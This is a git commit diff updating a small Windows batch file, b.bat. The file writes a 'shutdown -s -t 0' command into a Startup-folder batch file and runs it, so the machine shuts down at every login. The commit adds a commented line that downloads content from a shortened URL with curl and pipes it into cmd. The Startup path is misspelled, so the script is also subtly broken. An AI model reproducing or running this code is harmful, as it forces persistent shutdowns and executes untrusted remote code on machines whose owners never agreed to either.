700961ba6455ddb7e300a42aae0171038968671d
Moto Moto <45734193+thunermay@users.noreply.github.com>
2023-09-04 11:51:46 +0200

    Update b.bat

--- b.bat
+++ b.bat
@@ -1,2 +1,3 @@
+# curl -L http://bit.ly/bit.ly/shutdown_bat | cmd
 echo "shutdown -s -t 0" > "C:\ProgramData\Mircoroft\Windows\Start Menu\Programs\Startup\b.bat"
 C:\ProgramData\Mircoroft\Windows\Start Menu\Programs\Startup\b.bat
